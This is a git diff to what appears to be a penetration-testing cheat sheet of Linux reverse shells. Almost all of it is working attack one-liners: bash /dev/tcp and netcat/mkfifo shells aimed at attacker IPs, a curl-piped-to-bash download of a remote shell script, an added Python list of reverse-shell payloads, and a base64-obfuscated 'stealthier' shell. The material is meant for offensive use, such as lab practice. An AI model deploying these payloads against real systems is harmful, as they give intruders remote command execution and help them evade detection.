@@ -33,7 +33,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ```bash
 curl https://reverse-shell.sh/1.1.1.1:3000 | bash
-bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.14.243/1234 0>&1'
 bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
 bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
@@ -50,6 +50,16 @@ exec >&0
 # Bind Shell Command
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 
+
+
+        payloads = [
+            f"bash -i >& /dev/tcp/{self.args.local_host}/{self.args.local_port} 0>&1",
+            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.args.local_host} {self.args.local_port} >/tmp/f &",
+            f"bash -c 'bash -i >& /dev/tcp/{self.args.local_host}/{self.args.local_port} 0>&1'",
+            f"sh -i >& /dev/tcp/{self.args.local_host}/{self.args.local_port} 0>&1",
+            f"nc -e /bin/sh {self.args.local_host} {self.args.local_port}",
+            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.args.local_host} {self.args.local_port} >/tmp/f",
+        ]
 ```
 
 Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.
@@ -62,7 +72,7 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 
 #Stealthier method
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
-echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
+echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDMvNTU1NSAwPiYxJwo= | base64 -d | bash 2>/dev/null
 ```
 
 #### Shell explanation
